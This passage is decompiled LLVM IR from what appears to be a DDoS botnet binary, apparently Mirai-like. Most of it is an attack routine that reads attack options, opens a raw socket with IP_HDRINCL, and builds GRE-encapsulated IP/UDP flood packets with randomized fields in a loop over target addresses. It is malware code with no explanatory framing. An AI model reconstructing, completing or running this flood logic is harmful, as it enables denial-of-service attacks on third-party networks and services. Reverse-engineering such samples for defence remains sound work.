  store i32 %arg1, i32* @sl, align 4
  %v2_9a88 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9a8c = load i32, i32* @r5, align 4
  store i32 %v0_9a8c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a9c = load i32, i32* @r4, align 4
  %v5_9aa0 = inttoptr i32 %v0_9a8c to i32*
  %v6_9aa0 = call i32 @attack_get_opt_int(i32 %v0_9a9c, i32* %v5_9aa0, i32 2, i32 0)
  %v1_9aac = urem i32 %v6_9aa0, 256
  store i32 %v1_9aac, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9ab8 = load i32, i32* @r5, align 4
  store i32 %v0_9ab8, i32* %r1.global-to-local, align 4
  %v0_9abc = load i32, i32* @r4, align 4
  %v5_9ac0 = trunc i32 %v6_9aa0 to i8
  %v6_9ac4 = inttoptr i32 %v0_9ab8 to i32*
  %v7_9ac4 = call i32 @attack_get_opt_int(i32 %v0_9abc, i32* %v6_9ac4, i32 3, i32 65535)
  %v0_9ac8 = load i32, i32* @r5, align 4
  store i32 %v0_9ac8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9ac4, i32* %fp.global-to-local, align 4
  %v0_9ad8 = load i32, i32* @r4, align 4
  %v4_9adc = inttoptr i32 %v0_9ac8 to i32*
  %v5_9adc = call i32 @attack_get_opt_int(i32 %v0_9ad8, i32* %v4_9adc, i32 4, i32 64)
  %v1_9ae4 = urem i32 %v5_9adc, 256
  store i32 %v1_9ae4, i32* %ip.global-to-local, align 4
  %v0_9ae8 = load i32, i32* @r5, align 4
  store i32 %v0_9ae8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9af4 = load i32, i32* @r4, align 4
  %v6_9afc = inttoptr i32 %v0_9ae8 to i32*
  %v7_9afc = call i32 @attack_get_opt_int(i32 %v0_9af4, i32* %v6_9afc, i32 5, i32 1)
  %v1_9b08 = urem i32 %v7_9afc, 256
  store i32 %v1_9b08, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9b14 = load i32, i32* @r5, align 4
  store i32 %v0_9b14, i32* %r1.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r4, align 4
  %v5_9b20 = inttoptr i32 %v0_9b14 to i32*
  %v6_9b20 = call i32 @attack_get_opt_int(i32 %v0_9b18, i32* %v5_9b20, i32 6, i32 65535)
  %v0_9b28 = load i32, i32* @r5, align 4
  store i32 %v0_9b28, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_9b20, i32* @r8, align 4
  %v0_9b38 = load i32, i32* @r4, align 4
  %v4_9b3c = inttoptr i32 %v0_9b28 to i32*
  %v5_9b3c = call i32 @attack_get_opt_int(i32 %v0_9b38, i32* %v4_9b3c, i32 7, i32 65535)
  %v0_9b40 = load i32, i32* @r5, align 4
  store i32 %v0_9b40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_9b3c, i32* @r7, align 4
  %v0_9b50 = load i32, i32* @r4, align 4
  %v4_9b54 = inttoptr i32 %v0_9b40 to i32*
  %v5_9b54 = call i32 @attack_get_opt_int(i32 %v0_9b50, i32* %v4_9b54, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9b64 = load i32, i32* @r5, align 4
  store i32 %v0_9b64, i32* %r1.global-to-local, align 4
  %v0_9b68 = load i32, i32* @r4, align 4
  %v4_9b6c = inttoptr i32 %v0_9b64 to i32*
  %v5_9b6c = call i32 @attack_get_opt_int(i32 %v0_9b68, i32* %v4_9b6c, i32 1, i32 1)
  %v1_9b74 = urem i32 %v5_9b6c, 256
  store i32 %v1_9b74, i32* %ip.global-to-local, align 4
  %v0_9b78 = load i32, i32* @r5, align 4
  store i32 %v0_9b78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9b84 = load i32, i32* @r4, align 4
  %v5_9b8c = inttoptr i32 %v0_9b78 to i32*
  %v6_9b8c = call i32 @attack_get_opt_int(i32 %v0_9b84, i32* %v5_9b8c, i32 19, i32 0)
  %v0_9b94 = load i32, i32* @r5, align 4
  store i32 %v0_9b94, i32* %r1.global-to-local, align 4
  %v2_9b98 = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_9b98, i32* %r3.global-to-local, align 4
  store i32 %v6_9b8c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9ba4 = load i32, i32* @r4, align 4
  %v4_9ba8 = inttoptr i32 %v0_9b94 to i32*
  %v5_9ba8 = call i32 @attack_get_opt_int(i32 %v0_9ba4, i32* %v4_9ba8, i32 25, i32 %v2_9b98)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9bbc = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9bc0 = icmp eq i32 %v3_9bbc, -1
  store i1 %v7_9bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bc0, label %dec_label_pc_a060, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9bd4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9bd4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9be8 = call i32 @__GI_setsockopt(i32 %v3_9bbc, i32 0, i32 3, i32 %v6_9bd4, i32 4)
  %v7_9bec = icmp eq i32 %v5_9be8, -1
  store i1 %v7_9bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9bec, label %dec_label_pc_a058, label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bcc
  %v0_9bf4 = load i32, i32* @r8, align 4
  %v0_9bf8 = load i32, i32* @r7, align 4
  %v0_9bfc = load i32, i32* %fp.global-to-local, align 4
  %v0_9c00 = load i32, i32* @r6, align 4
  %v1_9c00 = urem i32 %v0_9c00, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9c08 = urem i32 %v0_9bf4, 65536
  store i32 %v3_9c08, i32* %r3.global-to-local, align 4
  %v3_9c0c = urem i32 %v0_9bf8, 65536
  store i32 %v3_9c0c, i32* %r4.global-to-local, align 4
  %v0_9c10 = load i32, i32* @sl, align 4
  %v2_9c10 = icmp eq i32 %v0_9c10, 0
  store i1 %v2_9c10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9c28 = urem i32 %v0_9bfc, 65536
  store i32 %v3_9c28, i32* @fp, align 4
  br i1 %v2_9c10, label %dec_label_pc_a06c, label %dec_label_pc_9c38

dec_label_pc_9c38:                                ; preds = %dec_label_pc_9bf4
  %v3_9bf8 = mul i32 %v0_9bf8, 65536
  %v3_9bf4 = mul i32 %v0_9bf4, 65536
  %v0_9bfc.not = or i32 %v0_9bfc, -65536
  %v1_9c3c = xor i32 %v0_9bfc.not, 65535
  %v3_9c40 = mul i32 %v5_9b54, 65536
  %v1_9c44 = add i32 %v3_9c40, 3407872
  %tmp67 = udiv i32 %v1_9c44, 256
  %v3_9c58 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9c3c, 256
  %v3_9c5c = and i32 %tmp68, 65280
  store i32 %v3_9c5c, i32* %ip.global-to-local, align 4
  %v1_9c60 = add i32 %v3_9c40, 524288
  %v1_9c68 = add i32 %v3_9c40, 1835008
  %tmp69 = udiv i32 %v1_9c3c, 256
  %v4_9c6c = urem i32 %tmp69, 256
  %v5_9c6c = or i32 %v4_9c6c, %v3_9c5c
  %v4_9c74 = udiv i32 %v1_9c44, 16777216
  %v5_9c74 = or i32 %v3_9c58, %v4_9c74
  store i32 %v5_9c74, i32* @r8, align 4
  %v3_9c80 = udiv i32 %v1_9c68, 256
  %tmp70 = mul i32 %v0_9bfc, 256
  %v3_9c84 = and i32 %tmp70, 65280
  store i32 %v3_9bf4, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_9bfc, 256
  %v4_9c94 = urem i32 %tmp71, 256
  %v5_9c94 = or i32 %v4_9c94, %v3_9c84
  %tmp72 = mul i32 %v0_9bf4, 256
  %v3_9c98 = and i32 %tmp72, 65280
  %v1_9c9c = and i32 %v3_9c80, 65280
  store i32 %v1_9c9c, i32* @r6, align 4
  store i32 %v3_9bf8, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_9bf8, 256
  %v3_9ca8 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_9bf4, 256
  %v4_9cac = urem i32 %tmp74, 256
  %v5_9cac = or i32 %v4_9cac, %v3_9c98
  store i32 %v5_9cac, i32* @lr, align 4
  %v4_9cb0 = udiv i32 %v1_9c68, 16777216
  %v5_9cb0 = or i32 %v1_9c9c, %v4_9cb0
  store i32 %v5_9cb0, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_9bf8, 256
  %v4_9cb4 = urem i32 %tmp75, 256
  %v5_9cb4 = or i32 %v4_9cb4, %v3_9ca8
  %tmp76 = udiv i32 %v1_9c60, 256
  %v3_9cb8 = and i32 %tmp76, 65280
  store i32 %v3_9cb8, i32* @r5, align 4
  %v4_9ccc = udiv i32 %v1_9c60, 16777216
  %v5_9ccc = or i32 %v3_9cb8, %v4_9ccc
  store i32 %v5_9ccc, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9d20 = sext i8 %v5_9ac0 to i32
  %sext12 = mul nuw i32 %v5_9c94, 65536
  %v4_9d3813 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9cb0, 65536
  %v4_9d9c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9c6c, 65536
  %v4_9da0 = sdiv i32 %sext9, 65536
  %v1_9da8 = trunc i32 %v4_9d9c to i16
  %v2_9dd0 = icmp eq i32 %v1_9c00, 0
  %sext10 = mul nuw i32 %v5_9cac, 65536
  %v4_9df0 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9cb4, 65536
  %v4_9df8 = sdiv i32 %sext11, 65536
  %v1_9d30 = trunc i32 %v5_9adc to i8
  br label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %bb82, %dec_label_pc_9c38
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_9ce0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_9a88, i32* %r2.global-to-local, align 4
  %v3_9ce8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9ce8, i32* %r3.global-to-local, align 4
  %v2_9cec = load i32, i32* @r4, align 4
  %v5_9cec = mul i32 %v2_9cec, 4
  %v6_9cec = add i32 %v5_9cec, %v2_9a88
  %v7_9cec = inttoptr i32 %v6_9cec to i32*
  store i32 %v2_9ce0, i32* %v7_9cec, align 4
  %v0_9cf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9cf0 = load i32, i32* %r3.global-to-local, align 4
  %v4_9cf0 = mul i32 %v1_9cf0, 4
  %v5_9cf0 = add i32 %v4_9cf0, %v0_9cf0
  %v6_9cf0 = inttoptr i32 %v5_9cf0 to i32*
  %v7_9cf0 = load i32, i32* %v6_9cf0, align 4
  store i32 %v7_9cf0, i32* %r4.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v7_9cf0 to i8*
  %v2_9cf4 = load i8, i8* %v1_9cf4, align 1
  %tmp = urem i8 %v2_9cf4, 16
  %v1_9cf8 = zext i8 %tmp to i32
  %v1_9cfc = or i32 %v1_9cf8, 64
  store i32 %v1_9cfc, i32* %r2.global-to-local, align 4
  %v1_9d00 = trunc i32 %v1_9cfc to i8
  store i8 %v1_9d00, i8* %v1_9cf4, align 1
  %v0_9d04 = load i32, i32* %r3.global-to-local, align 4
  %v5_9d08 = mul i32 %v0_9d04, 24
  store i32 %v5_9d08, i32* %r1.global-to-local, align 4
  %v0_9d0c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d0c = inttoptr i32 %v0_9d0c to i8*
  %v2_9d0c = load i8, i8* %v1_9d0c, align 1
  %v1_9d10 = and i8 %v2_9d0c, -16
  %v1_9d14 = or i8 %v1_9d10, 5
  store i32 %v1_9b08, i32* %r5.global-to-local, align 4
  store i8 %v1_9d14, i8* %v1_9d0c, align 1
  store i32 %v4_9d20, i32* %r2.global-to-local, align 4
  %v2_9d24 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d24 = add i32 %v2_9d24, 1
  %v4_9d24 = inttoptr i32 %v3_9d24 to i8*
  store i8 %v5_9ac0, i8* %v4_9d24, align 1
  store i32 %v1_9ae4, i32* %r3.global-to-local, align 4
  %v0_9d2c = load i32, i32* %r5.global-to-local, align 4
  %v2_9d2c = icmp eq i32 %v0_9d2c, 0
  store i1 %v2_9d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_9d30 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d30 = add i32 %v2_9d30, 8
  %v4_9d30 = inttoptr i32 %v3_9d30 to i8*
  store i8 %v1_9d30, i8* %v4_9d30, align 1
  %v0_9d34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9d34, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_9cd4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_9cd4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_9d3813, i32* %r5.global-to-local, align 4
  %v3_9d3c = load i32, i32* %r4.global-to-local, align 4
  %v4_9d3c = add i32 %v3_9d3c, 6
  %v5_9d3c = inttoptr i32 %v4_9d3c to i16*
  store i16 64, i16* %v5_9d3c, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9d44 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d44 = add i32 %v2_9d44, 9
  %v4_9d44 = inttoptr i32 %v3_9d44 to i8*
  store i8 47, i8* %v4_9d44, align 1
  %v0_9d48 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d48 = add i32 %v0_9d48, 20
  store i32 %v1_9d48, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9d50 = load i32, i32* %r5.global-to-local, align 4
  %v1_9d50 = trunc i32 %v0_9d50 to i16
  %v3_9d50 = add i32 %v0_9d48, 4
  %v4_9d50 = inttoptr i32 %v3_9d50 to i16*
  store i16 %v1_9d50, i16* %v4_9d50, align 2
  %v0_9d54 = load i32, i32* @r8, align 4
  %v1_9d54 = trunc i32 %v0_9d54 to i16
  %v2_9d54 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d54 = add i32 %v2_9d54, 2
  %v4_9d54 = inttoptr i32 %v3_9d54 to i16*
  store i16 %v1_9d54, i16* %v4_9d54, align 2
  %v0_9d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_9d58 = trunc i32 %v0_9d58 to i16
  %v2_9d58 = load i32, i32* %r2.global-to-local, align 4
  %v3_9d58 = add i32 %v2_9d58, 2
  %v4_9d58 = inttoptr i32 %v3_9d58 to i16*
  store i16 %v1_9d58, i16* %v4_9d58, align 2
  store i32 %v5_9ba8, i32* %r3.global-to-local, align 4
  %v0_9d60 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d60 = add i32 %v0_9d60, 24
  %v2_9d60 = inttoptr i32 %v1_9d60 to i8*
  %v3_9d60 = load i8, i8* %v2_9d60, align 1
  %v4_9d60 = zext i8 %v3_9d60 to i32
  store i32 %v4_9d60, i32* %r2.global-to-local, align 4
  %v2_9d64 = add i32 %v0_9d60, 12
  %v3_9d64 = inttoptr i32 %v2_9d64 to i32*
  store i32 %v5_9ba8, i32* %v3_9d64, align 4
  %v0_9d68 = load i32, i32* %r2.global-to-local, align 4
  %v1_9d68 = and i32 %v0_9d68, -241
  %v1_9d6c = or i32 %v1_9d68, 64
  store i32 %v1_9d6c, i32* %r2.global-to-local, align 4
  %v0_9d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9d70 = load i32, i32* @sb, align 4
  %v2_9d70 = add i32 %v1_9d70, %v0_9d70
  store i32 %v2_9d70, i32* %r1.global-to-local, align 4
  %v1_9d74 = add i32 %v2_9d70, 16
  %v2_9d74 = inttoptr i32 %v1_9d74 to i32*
  %v3_9d74 = load i32, i32* %v2_9d74, align 4
  store i32 %v3_9d74, i32* %r1.global-to-local, align 4
  %v1_9d78 = trunc i32 %v1_9d6c to i8
  %v2_9d78 = load i32, i32* %r4.global-to-local, align 4
  %v3_9d78 = add i32 %v2_9d78, 24
  %v4_9d78 = inttoptr i32 %v3_9d78 to i8*
  store i8 %v1_9d78, i8* %v4_9d78, align 1
  %v0_9d7c = load i32, i32* %r4.global-to-local, align 4
  %v1_9d7c = add i32 %v0_9d7c, 24
  %v2_9d7c = inttoptr i32 %v1_9d7c to i8*
  %v3_9d7c = load i8, i8* %v2_9d7c, align 1
  %v1_9d80 = and i8 %v3_9d7c, -16
  %v1_9d84 = or i8 %v1_9d80, 5
  store i8 %v1_9d84, i8* %v2_9d7c, align 1
  %v0_9d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v1_9d8c, 16
  %v3_9d8c = inttoptr i32 %v2_9d8c to i32*
  store i32 %v0_9d8c, i32* %v3_9d8c, align 4
  %v0_9d94 = load i32, i32* %r4.global-to-local, align 4
  %v1_9d94 = add i32 %v0_9d94, 24
  store i32 %v1_9d94, i32* @r5, align 4
  %v3_9d98 = add i32 %v0_9d94, 25
  %v4_9d98 = inttoptr i32 %v3_9d98 to i8*
  store i8 %v5_9ac0, i8* %v4_9d98, align 1
  store i32 %v4_9d9c, i32* %r2.global-to-local, align 4
  store i32 %v4_9da0, i32* %r3.global-to-local, align 4
  store i32 %v1_9ae4, i32* %r1.global-to-local, align 4
  %v2_9da8 = load i32, i32* @r5, align 4
  %v3_9da8 = add i32 %v2_9da8, 2
  %v4_9da8 = inttoptr i32 %v3_9da8 to i16*
  store i16 %v1_9da8, i16* %v4_9da8, align 2
  %v0_9dac = load i32, i32* %r3.global-to-local, align 4
  %v1_9dac = trunc i32 %v0_9dac to i16
  %v2_9dac = load i32, i32* @r5, align 4
  %v3_9dac = add i32 %v2_9dac, 4
  %v4_9dac = inttoptr i32 %v3_9dac to i16*
  store i16 %v1_9dac, i16* %v4_9dac, align 2
  %v0_9db0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9db0, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_9db8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9db8 = trunc i32 %v0_9db8 to i8
  %v2_9db8 = load i32, i32* @r5, align 4
  %v3_9db8 = add i32 %v2_9db8, 8
  %v4_9db8 = inttoptr i32 %v3_9db8 to i8*
  store i8 %v1_9db8, i8* %v4_9db8, align 1
  %v0_9dbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9dbc, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9dbc = load i32, i32* %r2.global-to-local, align 4
  %v2_9dbc = trunc i32 %v1_9dbc to i16
  %v3_9dbc = load i32, i32* @r5, align 4
  %v4_9dbc = add i32 %v3_9dbc, 6
  %v5_9dbc = inttoptr i32 %v4_9dbc to i16*
  store i16 %v2_9dbc, i16* %v5_9dbc, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9dc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_9dc0 = trunc i32 %v0_9dc0 to i8
  %v2_9dc0 = load i32, i32* @r5, align 4
  %v3_9dc0 = add i32 %v2_9dc0, 9
  %v4_9dc0 = inttoptr i32 %v3_9dc0 to i8*
  store i8 %v1_9dc0, i8* %v4_9dc0, align 1
  %v0_9dc4 = call i32 @rand_next()
  store i32 %v1_9c00, i32* %r1.global-to-local, align 4
  store i1 %v2_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v1_9dd4 = sub i32 1023, %v0_9dc4
  store i32 %v1_9dd4, i32* %r3.global-to-local, align 4
  br i1 %v2_9dd0, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_9ddc = load i32, i32* @r5, align 4
  %v3_9ddc = add i32 %v2_9ddc, 16
  %v4_9ddc = inttoptr i32 %v3_9ddc to i32*
  store i32 %v1_9dd4, i32* %v4_9ddc, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_9dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_9dd8 = add i32 %v1_9dd8, 16
  %v3_9dd8 = inttoptr i32 %v2_9dd8 to i32*
  %v4_9dd8 = load i32, i32* %v3_9dd8, align 4
  store i32 %v4_9dd8, i32* %r3.global-to-local, align 4
  %v2_9de0 = load i32, i32* @r5, align 4
  %v3_9de0 = add i32 %v2_9de0, 16
  %v4_9de0 = inttoptr i32 %v3_9de0 to i32*
  store i32 %v4_9dd8, i32* %v4_9de0, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_9de4 = load i32, i32* @r5, align 4
  %v2_9de4 = add i32 %v1_9de4, 12
  %v3_9de4 = inttoptr i32 %v2_9de4 to i32*
  store i32 %v0_9dc4, i32* %v3_9de4, align 4
  %v3_9de8 = load i32, i32* %stack_var_-44, align 4
  %v0_9dec = load i32, i32* %r4.global-to-local, align 4
  %v1_9dec = add i32 %v0_9dec, 44
  store i32 %v1_9dec, i32* @r6, align 4
  store i32 %v4_9df0, i32* %r2.global-to-local, align 4
  %v1_9df4 = add i32 %v3_9de8, 1
  store i32 %v1_9df4, i32* @r4, align 4
  store i32 %v4_9df8, i32* %r3.global-to-local, align 4
  %v1_9dfc = load i32, i32* @sl, align 4
  %v9_9dfc = icmp eq i32 %v1_9df4, %v1_9dfc
  store i1 %v9_9dfc, i1* %cpsr_z.global-to-local, align 1
  %v0_9e00 = load i32, i32* @r7, align 4
  %v1_9e00 = trunc i32 %v0_9e00 to i16
  %v3_9e00 = add i32 %v0_9dec, 48
  %v4_9e00 = inttoptr i32 %v3_9e00 to i16*
  store i16 %v1_9e00, i16* %v4_9e00, align 2
  %v0_9e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_9e04 = trunc i32 %v0_9e04 to i16
  %v2_9e04 = load i32, i32* @r6, align 4
  %v3_9e04 = inttoptr i32 %v2_9e04 to i16*
  store i16 %v1_9e04, i16* %v3_9e04, align 2
  %v0_9e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e08 = trunc i32 %v0_9e08 to i16
  %v2_9e08 = load i32, i32* @r6, align 4
  %v3_9e08 = add i32 %v2_9e08, 2
  %v4_9e08 = inttoptr i32 %v3_9e08 to i16*
  store i16 %v1_9e08, i16* %v4_9e08, align 2
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* %stack_var_-44, align 4
  %v5_9e10 = icmp slt i32 %v1_9df4, %v1_9dfc
  br i1 %v5_9e10, label %dec_label_pc_9cd4, label %dec_label_pc_9e14

dec_label_pc_9e14:                                ; preds = %bb82
  store i32 %v5_9b54, i32* %r5.global-to-local, align 4
  %v1_9e1c = add i32 %v5_9b54, 8
  store i32 %v1_9e1c, i32* %r4.global-to-local, align 4
  %v0_9e2c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_9e28.preheader

dec_label_pc_9e28.preheader:                      ; preds = %dec_label_pc_9e14, %dec_label_pc_a06c
  %v0_9e2c.pre = phi i32 [ %v0_9e2c.pre.pre, %dec_label_pc_9e14 ], [ 0, %dec_label_pc_a06c ]
  %stack_var_-124.0.ph = phi i32 [ %v1_9e1c, %dec_label_pc_9e14 ], [ %v1_a074, %dec_label_pc_a06c ]
  %storemerge = add i32 %v5_9b54, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_a020 = icmp eq i32 %v1_9c00, 0
  %v2_a03c = icmp eq i32 %v1_9b74, 0
  %v2_9e68 = icmp eq i32 %v5_9ba8, -1
  %v7_9e68 = icmp eq i32 %v5_9ba8, -1
  br label %dec_label_pc_9e28

dec_label_pc_9e28:                                ; preds = %dec_label_pc_9e28, %dec_label_pc_9eb8, %dec_label_pc_9e28.preheader
  %v0_9e2c = phi i32 [ %v0_9e2c.pre, %dec_label_pc_9e28.preheader ], [ 0, %dec_label_pc_9e28 ], [ %v1_9f54, %dec_label_pc_9eb8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9e2c = icmp eq i32 %v0_9e2c, 0
  store i1 %v2_9e2c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9e2c, label %dec_label_pc_9e28, label %dec_label_pc_9e38

dec_label_pc_9e38:                                ; preds = %dec_label_pc_9e28
  br label %dec_label_pc_9e3c

dec_label_pc_9e3c:                                ; preds = %dec_label_pc_9eb8, %dec_label_pc_9e38
  %v1_9e50 = phi i32 [ %v1_9f50, %dec_label_pc_9eb8 ], [ 0, %dec_label_pc_9e38 ]
  %v5_9e40 = mul i32 %v1_9e50, 24
  %v1_9e44 = load i32, i32* @sb, align 4
  %v2_9e44 = add i32 %v1_9e44, %v5_9e40
  store i32 %v2_9e44, i32* %r3.global-to-local, align 4
  store i32 %v2_9a88, i32* %r4.global-to-local, align 4
  %v1_9e4c = add i32 %v2_9e44, 20
  %v2_9e4c = inttoptr i32 %v1_9e4c to i8*
  %v3_9e4c = load i8, i8* %v2_9e4c, align 1
  %v4_9e4c = zext i8 %v3_9e4c to i32
  store i32 %v4_9e4c, i32* %r2.global-to-local, align 4
  %v4_9e50 = mul i32 %v1_9e50, 4
  %v5_9e50 = add i32 %v4_9e50, %v2_9a88
  %v6_9e50 = inttoptr i32 %v5_9e50 to i32*
  %v7_9e50 = load i32, i32* %v6_9e50, align 4
  store i32 %v7_9e50, i32* @r5, align 4
  %v7_9e54 = icmp eq i8 %v3_9e4c, 31
  store i1 %v7_9e54, i1* %cpsr_z.global-to-local, align 1
  %v1_9e58 = add i32 %v7_9e50, 24
  store i32 %v1_9e58, i32* @r6, align 4
  %v1_9e5c = add i32 %v7_9e50, 44
  store i32 %v1_9e5c, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9e4c, 32
  br i1 %tmp86, label %dec_label_pc_9f64, label %dec_label_pc_9e64

dec_label_pc_9e64:                                ; preds = %dec_label_pc_9e3c
  store i32 %v5_9ba8, i32* %r1.global-to-local, align 4
  store i1 %v7_9e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9e68, label %dec_label_pc_9fc4, label %dec_label_pc_9e70

dec_label_pc_9e70:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9e64
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9e78 = load i32, i32* @fp, align 4
  %v9_9e78 = icmp eq i32 %v0_9e78, 65535
  store i1 %v9_9e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e78, label %dec_label_pc_9fdc, label %dec_label_pc_9e80

dec_label_pc_9e80:                                ; preds = %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge, %dec_label_pc_9e70
  %v1_9e84 = phi i32 [ %v1_9e84.pre, %dec_label_pc_9fc4.dec_label_pc_9e80_crit_edge ], [ 65535, %dec_label_pc_9e70 ]
  store i32 %v3_9c08, i32* %r2.global-to-local, align 4
  %v9_9e84 = icmp eq i32 %v3_9c08, %v1_9e84
  store i1 %v9_9e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e84, label %dec_label_pc_a004, label %dec_label_pc_9e8c

dec_label_pc_9e8c:                                ; preds = %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge, %dec_label_pc_9e80
  %v1_9e90 = phi i32 [ %v1_9e90.pre, %dec_label_pc_9fdc.dec_label_pc_9e8c_crit_edge ], [ %v1_9e84, %dec_label_pc_9e80 ]
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %v9_9e90 = icmp eq i32 %v3_9c0c, %v1_9e90
  store i1 %v9_9e90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9e90, label %dec_label_pc_a018, label %dec_label_pc_9e98

dec_label_pc_9e98:                                ; preds = %dec_label_pc_a004, %dec_label_pc_9e8c
  store i32 %v1_9c00, i32* @r4, align 4
  store i1 %v2_a020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a020, label %dec_label_pc_a034, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_9e98
  %v1_9ea0 = load i32, i32* @r5, align 4
  %v2_9ea0 = add i32 %v1_9ea0, 16
  %v3_9ea0 = inttoptr i32 %v2_9ea0 to i32*
  %v4_9ea0 = load i32, i32* %v3_9ea0, align 4
  store i32 %v4_9ea0, i32* %r3.global-to-local, align 4
  %v2_9ea4 = load i32, i32* @r6, align 4
  %v3_9ea4 = add i32 %v2_9ea4, 16
